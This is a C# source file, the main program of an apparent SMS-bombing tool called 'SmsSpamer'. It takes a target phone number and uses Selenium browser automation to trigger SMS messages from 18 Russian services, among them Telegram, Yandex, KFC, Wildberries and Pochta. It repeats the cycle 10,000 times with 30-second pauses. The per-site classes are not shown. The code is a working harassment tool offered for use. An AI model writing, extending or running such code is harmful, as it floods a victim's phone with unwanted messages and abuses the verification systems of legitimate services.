using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using SmsSpamer.Sites;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

 namespace SmsSpamer
{
    public class Program
    {
        public static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Введите номер телефона с 7");
                ISite.PhoneNumber = (string)Console.ReadLine();
                ISite.PhoneNumberWithout7 = ISite.PhoneNumber.Remove(0, 1);
            }
            else
            {
                ISite.PhoneNumber = args[0];
                ISite.PhoneNumberWithout7 = args[1];
            }
           

            ISite telegram = new Telegram();
            ISite iGoods = new IGoods();
            ISite yandex = new Yandex();
            ISite sportMaster = new SportMaster();
            ISite dns = new MVideo();
            ISite kfc = new Kfc();
            ISite toToPizza = new ToToPizza();
            ISite x5 = new X5();
            ISite magnit = new Magnit();
            ISite justFood = new JustFood();
            ISite growFood = new GrowFood();
            ISite lenta = new Lenta();
            ISite wildberries = new Wildberries();
            ISite mFood = new MFood();
            ISite macdonalds = new Macdonalds();
            ISite ok = new Ok();
            ISite yota = new Yota();
            ISite pochta = new Pochta();

            List<ISite> sites = new List<ISite>();
            sites.Add(telegram);
            sites.Add(iGoods);
            sites.Add(yandex);
            sites.Add(sportMaster);
            sites.Add(dns);
            sites.Add(kfc);
            sites.Add(toToPizza);
            sites.Add(x5);
            sites.Add(magnit);
            sites.Add(justFood);
            sites.Add(growFood);
            sites.Add(lenta);
            sites.Add(wildberries);
            sites.Add(mFood);
            sites.Add(macdonalds);
            sites.Add(ok);
            sites.Add(yota);
            sites.Add(pochta);

            for(int i = 0; i < 10000; i++)
            {
                foreach (var item in sites)
                {
                    try
                    {
                        item.SpamSite();

                        Console.ForegroundColor = ConsoleColor.Green; // устанавливаем цвет
                        Console.WriteLine($"{item.ToString()}");
                        Console.ResetColor();

                        Thread.Sleep(30*1000);

                        ((IJavaScriptExecutor)ISite.browser).ExecuteScript("window.open();");
                        ISite.browser.Close();
                        ISite.browser.SwitchTo().Window(ISite.browser.WindowHandles.Last());
                    }
                    catch (Exception ex)
                    {
                        Console.ForegroundColor = ConsoleColor.Red; // устанавливаем цвет
                        Console.WriteLine($"{item.ToString()}");
                        Console.ResetColor();
                    }

                }
            }            

            Console.WriteLine("DONE");
            Console.ReadKey();
        }
    }
}
